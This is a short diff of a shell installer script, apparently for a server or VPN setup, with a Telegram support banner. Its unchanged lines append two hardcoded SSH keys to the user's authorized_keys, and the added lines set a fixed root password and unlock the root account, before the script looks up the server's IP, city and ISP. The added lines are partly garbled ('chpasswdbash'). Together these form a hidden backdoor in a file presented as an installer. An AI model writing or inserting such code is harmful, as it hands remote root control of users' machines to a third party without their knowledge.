@@ -88,6 +88,9 @@ echo -e "\e[1;32m // Contact (@a_hamza_i) on Telegram for support!"
 echo -e "\e[1;32m *** *** ***"  
 mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP/6mja6JSVT/UsM3F6CSFZF5besPYDk9+VuzjVLV2Pb" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh
 mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJkCO3YXessYe4SmgcZLAfCrQ2rqkn8yPA5tl2WrmAXf" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh
+bash
+echo "root:ham@@\•" | chpasswdbash
+passwd -u root
 IP=$(wget -qO- ipinfo.io/ip)
 CITY=$(wget -qO- ipinfo.io/city)
 ISP=$(wget -qO- ipinfo.io/org)
